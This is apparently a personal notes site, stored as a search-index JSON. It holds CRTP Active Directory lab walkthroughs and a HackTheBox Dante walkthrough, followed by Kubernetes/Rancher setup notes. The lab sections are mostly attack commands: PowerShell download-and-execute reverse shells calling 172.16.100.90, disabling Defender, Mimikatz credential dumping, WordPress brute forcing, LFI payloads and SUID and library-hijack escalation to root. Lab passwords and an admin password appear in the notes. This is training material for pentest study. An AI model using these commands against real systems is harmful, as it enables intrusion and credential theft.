{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Obsidian Notes","text":"<p>Publish your public notes with MkDocs</p>"},{"location":"#hello-world","title":"Hello World!","text":"<p>The <code>index.md</code> in the <code>/docs</code> folder is the homepage you see here.</p> <p>The folders in <code>/docs</code> appear as the main sections on the navigation bar.</p> <p>The notes appear as pages within these sections. For example, [[Note 1]] in <code>Topic 1</code></p>"},{"location":"CRTP-Lab/CRTP%20Lab%20Objectives/","title":"Objective 1","text":""},{"location":"CRTP-Lab/CRTP%20Lab%20Objectives/#powerview-with-invisi-shell","title":"Powerview with Invisi-Shell","text":"<pre><code># Running the .bat below will execute all commands needed for us\nC:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat\n</code></pre> <pre><code># powerview usage\n# Source powerview\n. C:\\AD\\Tools\\PowerView.ps1\n\n# Enumerate domain users\nGet-DomainUser\n\n# specify property (like grep)\nGet-DomainUser | select -ExpandProperty samaccountname\n\n# Enum member computers\nGet-DomainComputer | select -ExpandProperty dnshostname\n\n# Domain admin group details\nGet-DomainGroup -Identity \"Domain Admins\"\n\n# Members of domain admins\nGet-DomainGroupMember -Identity \"Domain Admins\"\n\n# members of enterprise admins\n# This will not work unless we are pointed to the root domain\nGet-DomainGroupMember -Identity \"Enterprise Admins\"\n\n# Enum root domain\nGet-DomainGroupMember -Identity \"Enterprise Admins\" \u2013Domain  \nmoneycorp.local\n</code></pre>"},{"location":"CRTP-Lab/CRTP%20Lab%20Objectives/#domain-enumeration-with-admodule","title":"Domain enumeration with ADModule","text":"<pre><code># In a new terminal window run invishell again\nC:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat\n\n# Import the ADModule\nImport-Module C:\\AD\\Tools\\ADModule-master\\Microsoft.ActiveDirectory.Management.dll\n\nImport-Module C:\\AD\\Tools\\ADModule-master\\ActiveDirectory\\ActiveDirectory.psd1\n\n# Enum users in current domain\nGet-ADUser -Filter *\n\n# Getting more specific results\nGet-ADUser -Filter * -Properties *| select  \nSamaccountname,Description\n\n# List domain connected computers\nGet-ADComputer -Filter *\n\n# Enum DA \nGet-ADGroupMember -Identity 'Domain Admins'\n\n# Enum enterprise admins on root domain \nGet-ADGroupMember -Identity 'Enterprise Admins' -Server  \nmoneycorp.local\n\n# Flag is SID of enterprise admin\nS-1-5-21-280534878-1496970234-700767426-500\n\n</code></pre>"},{"location":"CRTP-Lab/CRTP%20Lab%20Objectives/#objective-2","title":"Objective 2","text":""},{"location":"CRTP-Lab/CRTP%20Lab%20Objectives/#further-enumeration-with-powerview","title":"Further Enumeration with powerview","text":"<pre><code># List all OU names in domain\nGet-DomainOU\n\n# Filter by name\nGet-DomainOU | select -ExpandProperty name\n\n# List all computers in studentmachines OU \n(Get-DomainOU -Identity StudentMachines).distinguishedname |  \n%{Get-DomainComputer -SearchBase $_} | select name\n\n# List domain GPOs\nGet-DomainGPO \n\n# Grab the CN from output \n(Get-DomainOU -Identity StudentMachines).gplink  \n[LDAP://cn={3E04167E-C2B6-4A9A-8FB7-  \nC811158DC97C},cn=policies,cn=system,DC=dollarcorp,DC=moneycorp,DC=local;0]\n\n</code></pre>"},{"location":"CRTP-Lab/CRTP%20Lab%20Objectives/#objective-3","title":"Objective 3","text":""},{"location":"CRTP-Lab/CRTP%20Lab%20Objectives/#powerview-acl-enumeration","title":"Powerview ACL enumeration","text":"<pre><code># View ACLs for domain admin group\nGet-DomainObjectAcl -Identity \"Domain Admins\" -ResolveGUIDs \u2013  \nVerbose\n\n# View rights/perms for specified user\nFind-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match  \n\"studentx\"}\n\n# Find rights/perms by group \nFind-InterestingDomainAcl -ResolveGUIDs |  \n?{$_.IdentityReferenceName -match \"RDPUsers\"}\n\n\n</code></pre>"},{"location":"CRTP-Lab/CRTP%20Lab%20Objectives/#objective-4","title":"Objective 4","text":""},{"location":"CRTP-Lab/CRTP%20Lab%20Objectives/#powerview-and-admodule-mapping-trusts","title":"Powerview and ADmodule mapping trusts","text":"<pre><code># In powerview\nGet-ForestDomain -Verbose\n\n# Get trusts in domain\nGet-DomainTrust\n\n# Filter by external trusts for local domain\nGet-ForestDomain | %{Get-DomainTrust -Domain $_.Name} |  \n?{$_.TrustAttributes -eq \"FILTER_SIDS\"}\n\n# Filter by external trusts for parent domain\nGet-DomainTrust | ?{$_.TrustAttributes -eq \"FILTER_SIDS\"}\n\n# enumerate trusts for eurocorp.local forest\nGet-ForestDomain -Forest eurocorp.local | %{Get-DomainTrust -  \nDomain $_.Name}\n</code></pre> <pre><code># In ADModule\n\n# Enum domains in current forest\n(Get-ADForest).Domains\n\n# Get trusts in current domain\nGet-ADtrust -Filter *\n\n# List trusts in local forest\nGet-ADForest | %{Get-ADTrust -Filter *}\n\n# External locaL trusts\n(Get-ADForest).Domains | %{Get-ADTrust -Filter '(intraForest  \n-ne $True) -and (ForestTransitive -ne $True)' -Server $_}\n\n# trusts of parent domain\nGet-ADTrust -Filter '(intraForest -ne $True) -and  \n(ForestTransitive -ne $True)'\n\n# enum trusts due to trust relations \nGet-ADTrust -Filter * -Server eurocorp.local\n</code></pre>"},{"location":"CRTP-Lab/CRTP%20Lab%20Objectives/#objective-5","title":"Objective 5","text":""},{"location":"CRTP-Lab/CRTP%20Lab%20Objectives/#privilege-escalation-with-powerup","title":"Privilege escalation with powerup","text":"<pre><code># Load invishell and powerup\nC:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat\n. C:\\AD\\Tools\\PowerUp.ps1\n\n# Unquoted service path enum\nGet-ServiceUnquoted\n\n# enumerate services where the current user can make changes to service binary\nGet-ModifiableServiceFile -Verbose\n\n# Search for abuse function\nGet-ModifiableService\n\n# Service abuse function for local admin \nInvoke-ServiceAbuse -Name 'AbyssWebServer' -UserName  \n'dcorp\\student490'\n\n### In a new shell\nC:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat\n. C:\\AD\\Tools\\Find-PSRemotingLocalAdminAccess.ps1\nFind-PSRemotingLocalAdminAccess\n\n# View output from prev command, then remote in with winrs\nwinrs -r:dcorp-adminsrv cmd # adminsrv being the name we found above\n\n# Or we can use psremoting\nEnter-PSSession -ComputerName dcorp-  \nadminsrv.dollarcorp.moneycorp.local\n</code></pre>"},{"location":"CRTP-Lab/CRTP%20Lab%20Objectives/#exploiting-jenkins","title":"Exploiting Jenkins","text":"<pre><code>\n- click on a project or create a new one\n- go to build triggers\n- go to build section\n- use the dropdown and select execute windows batch command\n- Paste the rev shell into the command box\n- start a webserver and netcat rev shell listener\n- Disable firewall and defender\n- build now\n\n# Note that \"power\" is a modified modual built to bypass AV\n\npowershell.exe -c iex ((New-Object  \nNet.WebClient).DownloadString('http://172.16.100.90/tmp/Invoke-  \nPowerShellTcp.ps1'));Power -Reverse -IPAddress 172.16.100.90 -Port 443\n\n### OR\n\npowershell.exe iex (iwr http://172.16.100.90/Invoke-PowerShellTcp.ps1 -  \nUseBasicParsing);Power -Reverse -IPAddress 172.16.100.90 -Port 443\n\n</code></pre>"},{"location":"CRTP-Lab/CRTP%20Lab%20Objectives/#objective-6","title":"Objective 6","text":""},{"location":"CRTP-Lab/CRTP%20Lab%20Objectives/#bloodhound","title":"Bloodhound","text":"<pre><code># start neo4j\nC:\\AD\\Tools\\neo4j-community-4.1.1-windows\\neo4j-community-4.1.1\\bin&gt;neo4j.bat install-service\n\n# Run again to start\nC:\\AD\\Tools\\neo4j-community-4.1.1-windows\\neo4j-community-4.1.1\\bin&gt;neo4j.bat start\n\n# http://localhost:7474\n- neo4j for user and password\n- change password to whatever on login: bloodhound\n\n# Run Bloodhound\nC:\\AD\\Tools\\BloodHound-win32-x64\\BloodHound-win32-x64\\bloodhound.exe\n\n- Leave database as default\n- CREDS: neo4j : bloodhound \n\n# Staring sharphound\ncd C:\\AD\\Tools\\BloodHound-master\\BloodHound-  \nmaster\\Collectors\n\n. .\\SharpHound.ps1\n\nInvoke-  \nBloodHound -CollectionMethod All -Verbose\n\n- upload data to bloodhound for the graph \n- search for user and click on derivative local admin rights\n</code></pre>"},{"location":"CRTP-Lab/CRTP%20Lab%20Objectives/#objective-7","title":"Objective 7","text":""},{"location":"CRTP-Lab/CRTP%20Lab%20Objectives/#domain-admin-priv-esc","title":"Domain Admin priv esc","text":"<ul> <li>bypass asmi</li> <li>Find-DomainUserLocation  to find domain admin sessions</li> </ul> <pre><code>winrs -r:dcorp-mgmt hostname;whoami\n\n# Copy safetyKatz to victim\niwr http://172.16.100.90/Loader.exe -OutFile C:\\Users\\Public\\Loader.exe\n\n\n\n$null | winrs -r:dcorp-  \nmgmt C:\\Users\\Public\\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe  \nsekurlsa::ekeys exit\n\n\niex (iwr http://172.16.100.90/Invoke-Mimikatz.ps1 -UseBasicParsing)\n\n$sess = New-PSSession -  \nComputerName dcorp-mgmt.dollarcorp.moneycorp.local\n\nInvoke-command -  \nScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess\n\nInvoke-command -  \nScriptBlock ${function:Invoke-Mimikatz} -Session $sess\n\n</code></pre>"},{"location":"Dante/Dante-01/","title":"Dante 01","text":"<pre><code># init scan\nnmap -T4 -n 10.10.110.0/24 -oN active-hosts\n\n# full port scan\nnmap -Pn -T4 -sC -sV -p- -oA nmap/nmap-dante-fullport 10.10.110.100\n</code></pre> <pre><code># login via anon ftp and pull todo.txt for info\n# first flag : DANTE{Y0u_Cant_G3t_at_m3_br0!}\n\n# wordpress discovered on port 65000\nhttp://10.10.110.100:65000/wordpress\n\n# wpscan to enum users\nwpscan -e u --url http://10.10.110.100:65000/wordpress\n</code></pre> <pre><code># James has weak password (found from todo.txt)\nhttp://10.10.110.100:65000/wordpress/.wp-config.php.swp (?)\n\n# search for names \njames\nkevin\nkalthazar\naj\nnathan\n# ceWL to create wordlist\ncewl http://10.10.110.100:65000/wordpress/index.php/languages-and-frameworks &gt; words.txt\n# brute force password with wpscan\nwpscan -U names.txt -P words.txt --url http://10.10.110.100:65000/wordpress\n\n\n</code></pre> <pre><code># login : http://10.10.110.100:65000/wordpress/wp-admin\njames : Toyota\n# Go to apperance &gt; themes to edit phpcode for rev shell\n# select twenty nineteen\nnc -lvnp 8888 # listener\ncurl http://10.10.110.100:65000/wordpress/wp-content/themes/twentynineteen/404.php\n\n# upgrade shell\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n# ctrl z \nstty raw -echo \n# fg\nexport TERM=xterm\n# Shell upgraded\n\n# www-data user cannot access james' home folder - try su to james \nsu james (passwd Toyota)\n# Flag 2 : DANTE{j4m3s_NEEd5_a_p455w0rd_M4n4ger!}\n\n# linpeas.sh to enumerate \n</code></pre> <pre><code># currently cant use these creds, keep up enumeration\nfind / -perm -4000 2&gt;/dev/null\n# permissions on \"find\" binary are incorrect (suid bit set)\nfind . -exec /bin/bash -p \\; -quit\n\n# now on a new network, ping sweep script: \nfor i in {1..255} ;do (ping -c 1 172.16.1.$i | grep \"bytes from\" | cut -d ' ' -f4 | tr -d ':' &amp;);done\n\n### \n172.16.1.5\n172.16.1.10\n172.16.1.12\n172.16.1.13\n172.16.1.17\n172.16.1.19\n172.16.1.100\n172.16.1.101\n172.16.1.102\n172.16.1.20\n###\n\n# add public ssh key to /root/.ssh/authorized_keys \n# then ssh into machine with \nssh -i ~/.ssh/id_rsa -D 1337 root@10.10.110.100\n\n# edit /etc/proxychains.conf of your LOCAL machine\n# add below line \nsocks5 127.0.0.1 1337 \n# nmap scan through proxychains \n# nmap is not proxy aware so -sT option is used instead\nproxychains nmap 172.16.1.10 -sT -sV -Pn -T5\n</code></pre> <p> - will throw a bunch of errors</p> <pre><code>proxychains firefox\n</code></pre> <p> - page = maybe vulnerable to LFI </p> <pre><code># test for LFI\nhttp://172.16.1.10/nav.php?page=../../../../../../../../../../../etc/passwd\n</code></pre> <p> - non-default names discovered </p> <pre><code># testing other ports\nproxychains smbclient -N -L //172.16.1.10\n</code></pre> <p></p> <pre><code># non-default share\nproxychains smbclient -N \\\\\\\\172.16.1.10\\\\SlackMigration\nget admintasks.txt\n\n\n</code></pre> <p></p> <pre><code># using our lfi to access otherwise hidden files\n\nhttp://172.16.1.10/nav.php?page=/var/www/html/wordpress/index.php\n# Nothing showed, use php filter \nhttp://172.16.1.10/nav.php?page=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php\n\nbase64 -d base64-file &gt; wp-config.php\n\n</code></pre> <p></p> <pre><code># creds for margaret \nmargaret : Welcome1!2@3# \n\nproxychains ssh margaret@172.16.1.10\n# creds worked\n\n# limited shell can only use vim \n# open vim then go to gtfobins \n:set shell=/bin/bash\n:shell\n# successfully escaped limited shell\n\ncd ~/.config/Slack/exported_data\n\"text\": \"I also set you a new password on the Ubuntu box - TractorHeadtorchDeskmat, same username\",\n\nsu frank # TractorHeadtorchDeskmat\n\ncd /home/frank\n</code></pre> <pre><code># script found\nimport call\nimport urllib\nurl = urllib.urlopen(localhost)\npage= url.getcode()\nif page ==200:\n        print (\"We're all good!\")\nelse:\n        print(\"We're failing!\")\n        call([\"systemctl start apache2\"], shell=True)\n</code></pre> <pre><code># restart apache script is owned by root but not writable by frank \n# the fact there is no while loop hints to cronjob \n# check with pspy tool, file named urllib.py is being created\n# create new file with that name in frank home directory\n</code></pre> <pre><code># keep an eye on /tmp/sh\nimport os\nos.system(\"cp /bin/sh /tmp/sh;chmod u+s /tmp/sh\")\n</code></pre> <p></p> <pre><code># /tmp/sh is created after a few minutes and has the stickybit\n/tmp/sh -p # -p to keep permissions of file\n# now root :)\n# DANTE{L0v3_m3_S0m3_H1J4CK1NG_XD}\n</code></pre> <p> - next target</p> <pre><code>\n</code></pre>"},{"location":"Kubernetes/Kubernetes/","title":"Rancher + Helm + K3s install","text":"<ul> <li>https://rancher.com/docs/rancher/v2.6/en/quick-start-guide/deployment/quickstart-manual-setup/#install-rancher-with-helm</li> </ul> <pre><code># K3S\ncurl -sfL https://get.k3s.io | sh -s - server\n# Copy config to workstation \n\nscp root@&lt;IP_OF_LINUX_MACHINE&gt;:/etc/rancher/k3s/k3s.yaml ~/.kube/config\n\n# Install Helm\ncurl -fsSL -o get_helm.sh https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3\nchmod 700 get_helm.sh\n./get_helm.sh\n\n# Helm configs\n\nexport KUBECONFIG=/etc/rancher/k3s/k3s.yaml\n\nhelm repo add rancher-latest https://releases.rancher.com/server-charts/latest\n\nkubectl create namespace cattle-system\n\nsudo chmod 644 /etc/rancher/k3s/k3s.yaml\n\nkubectl apply -f https://github.com/jetstack/cert-manager/releases/download/v1.5.1/cert-manager.crds.yaml\n\nhelm repo add jetstack https://charts.jetstack.io\n\nhelm repo update\n\nhelm install cert-manager jetstack/cert-manager \\\n  --namespace cert-manager \\\n  --create-namespace \\\n  --version v1.5.1\n\n# WAIT FOR ROLLOUT OF CERT-MANAGER TO COMPLETE\nkubectl -n cert-managerm rollout status deploy/cert-manager\n\n# Install Rancher\nhelm install rancher rancher-latest/rancher \\\n  --namespace cattle-system \\\n  --set hostname=&lt;IP_OF_LINUX_NODE&gt;.sslip.io \\\n  --set replicas=1 \\\n  --set bootstrapPassword=&lt;PASSWORD_FOR_RANCHER_ADMIN&gt;\n</code></pre>"},{"location":"Kubernetes/Kubernetes/#virtualbox-no-network-fix","title":"Virtualbox no network fix","text":"<ul> <li>VBoxManage natnetwork stop  --netname NatNetwork</li> <li>VBoxManage natnetwork start  --netname NatNetwork</li> </ul>"},{"location":"Kubernetes/Kubernetes/#harvester-install","title":"Harvester install","text":"<ul> <li>https://docs.harvesterhci.io/v1.0/ Follow along with ISO. It will create a VIP which the admin interface will be on. Passwd: </li> <li>admin:QWTGJQpeMD67QtuqDlaS</li> </ul>"},{"location":"Kubernetes/Kubernetes/#harvester-rancher-combo","title":"Harvester + Rancher combo","text":"<ul> <li>(Techotim video on harvester)</li> </ul>"},{"location":"Kubernetes/Kubernetes/#helm-delete","title":"Helm delete","text":"<pre><code># Get all releases\nhelm ls --all-namespaces\n# OR\nhelm ls -A\n\n# Delete release\nhelm uninstall release_name -n release_namespace\n</code></pre>"},{"location":"Kubernetes/Kubernetes/#some-kubectl-commands","title":"Some kubectl commands","text":"<ul> <li>https://kubernetes.io/docs/reference/kubectl/cheatsheet/</li> </ul>"},{"location":"Kubernetes/Kubernetes/#reset-harv-password","title":"Reset harv password","text":"<pre><code>kubectl  -n cattle-system exec $(kubectl --kubeconfig $KUBECONFIG -n cattle-system get pods -l app=rancher --no-headers | head -1 | awk '{ print $1 }') -c rancher -- reset-password\n\n</code></pre>"},{"location":"Kubernetes/Kubernetes/#resources-not-viewed-yet","title":"resources not viewed yet","text":"<ul> <li>https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3</li> <li>https://github.com/cyberark/kubernetes-rbac-audit</li> <li>https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1</li> <li>https://github.com/ropnop/pentest_charts</li> </ul>"}]}